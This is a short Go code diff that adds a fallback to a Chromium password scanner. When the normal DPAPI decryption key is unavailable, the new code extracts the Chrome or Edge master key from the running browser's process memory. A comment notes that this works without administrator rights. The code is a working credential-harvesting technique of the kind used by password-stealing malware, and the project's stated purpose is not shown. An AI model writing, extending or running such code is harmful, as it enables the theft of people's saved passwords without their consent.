@@ -197,6 +197,23 @@ func scanChromiumPasswords(b chromiumBrowser, profile string, key []byte) ([]Pas
 		source = fmt.Sprintf("%s (%s)", b.name, profile)
 	}
 
+	// DPAPI gave us no key — try extracting it from the running browser's heap.
+	// Chrome/Edge run at Medium integrity so PROCESS_VM_READ works without admin.
+	if key == nil {
+		for _, row := range rows {
+			if len(row) < 6 {
+				continue
+			}
+			blob, _ := row[5].([]byte)
+			if len(blob) >= 3 && (string(blob[:3]) == "v10" || string(blob[:3]) == "v20") {
+				if memKey, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
+					key = memKey
+				}
+				break // one attempt is enough to get the master key
+			}
+		}
+	}
+
 	var entries []PasswordEntry
 	for _, row := range rows {
 		// logins table columns:
